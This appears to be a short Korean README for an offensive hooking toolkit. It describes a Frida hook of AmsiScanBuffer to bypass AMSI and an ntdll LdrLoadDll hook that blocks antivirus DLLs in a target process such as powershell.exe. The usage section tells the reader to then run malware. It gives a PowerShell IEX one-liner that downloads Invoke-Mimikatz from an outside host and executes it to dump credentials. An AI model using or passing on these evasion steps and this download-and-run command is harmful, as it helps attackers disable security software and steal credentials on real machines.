## Hooking
@VeryBigsilver

후킹 기법만 다룹니다

---
### frida hooking
frida를 이용한 AMSIScanBuffer 후킹

```
new_hook.exe 실행 후  
mimikatz 명령어 실행 
예) coffee
```

### ntdllHooking
ntdll!LdrLoadDll 후킹
(dll을 불러올 떄마다 후킹 후 백신 관련 dll이면 ret)

```
ntdllHooking.exe <원하는 프로세스> 
예) ntdllHooking.exe powershell.exe
이후 해당 스크립트 창에서 dll blocked 뜨면 악성코드 실행
예) IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -command "coffee"
```
